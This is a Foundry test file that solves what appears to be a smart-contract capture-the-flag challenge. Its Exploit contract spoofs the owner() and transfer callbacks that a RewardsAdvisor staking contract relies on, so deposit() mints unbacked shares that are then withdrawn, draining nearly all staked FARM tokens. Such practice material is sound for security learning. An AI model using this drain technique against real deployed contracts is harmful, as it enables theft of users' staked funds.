// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// core contracts
import {Token} from "src/other/Token.sol";
import {GovToken} from "src/freebie/GovToken.sol";
import {RewardsAdvisor} from "src/freebie/RewardsAdvisor.sol";


contract Testing is Test {

    address attacker = makeAddr('attacker');
    address o1 = makeAddr('o1');
    address o2 = makeAddr('o2');
    address admin = makeAddr('admin'); // should not be used
    address adminUser = makeAddr('adminUser'); // should not be used

    Token farm;
    GovToken govToken;
    RewardsAdvisor rewardsAdvisor;

    /// preliminary state
    function setUp() public {

        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // deploying token contract
        vm.prank(admin);
        farm = new Token('FARM','FARM');

        address[] memory addresses = new address[](2);
        uint256[] memory amounts = new uint256[](2);

        addresses[0]=adminUser; addresses[1]=attacker; // attacker gets 1
        amounts[0]=10_000e18; amounts[1]=1e18;
        vm.prank(admin);
        farm.mintPerUser(addresses, amounts);

        // deploying core contracts
        vm.prank(admin);
        govToken = new GovToken('xFARM','xFARM');

        vm.prank(admin);
        rewardsAdvisor = new RewardsAdvisor(address(farm),address(govToken));

        vm.prank(admin);
        govToken.transferOwnership(address(rewardsAdvisor));

        // --other user stakes their FARM tokens
        vm.prank(adminUser);
        farm.approve(address(rewardsAdvisor),type(uint).max);
        vm.prank(adminUser);
        rewardsAdvisor.deposit(10_000e18,payable(adminUser),adminUser);

    }

    /// solves the challenge
    function testChallengeExploit() public {
        vm.startPrank(attacker,attacker);
        
        // implement solution here
        //same exploit as challenge 6
        //We can skip some check because the rewardsAdvisor will call our contract at some moment
        Exploit _exploit = new Exploit(address(rewardsAdvisor),address(farm),address(govToken));
        _exploit.pwn(address(adminUser));
        vm.stopPrank();
        validation();
    }

    /// expected final state
    function validation() public {

        // attacker drains 99.99%+ of the `FARM` tokens from RewardsAdvisor staking contract
        assertGe(farm.balanceOf(attacker),10_000e18);
        assertLe(farm.balanceOf(address(rewardsAdvisor)),1e18);

    }

}

contract Exploit {

    Token farm;
    GovToken govToken;
    RewardsAdvisor rewardsAdvisor;
    address private attacker;
    
    constructor(address _target, address _farm, address _xfarm){
        farm = Token(_farm);
        govToken = GovToken(_xfarm);
        rewardsAdvisor = RewardsAdvisor(_target);
        attacker = msg.sender;

    }

    //Will be called during deposit()
    function owner() external returns (address){
        return address(this);
    }

    //Will be called during deposit()
    function delegatedTransferERC20(address token, address to, uint256 amount) external {

    }

    //Deposit() will call our contract and so we will skip some process like the transfer of farm token
    function pwn(address _target) external{
        //owner = address(this);
        uint256 amount = govToken.balanceOf(address(_target)) * uint256(10000) / uint256(1);
        console.log("amount shares we want : " ,amount);
        rewardsAdvisor.deposit(amount,payable(address(this)),address(this));
        console.log("amount shares exploit got : " ,govToken.balanceOf(address(this)));
        rewardsAdvisor.withdraw(govToken.balanceOf(address(this)),attacker,payable(address(this)));
        console.log("amount farm attacker got : " ,farm.balanceOf(address(attacker)));
        //farm.transfer(owner,farm.balanceOf(address(this)));
    }
}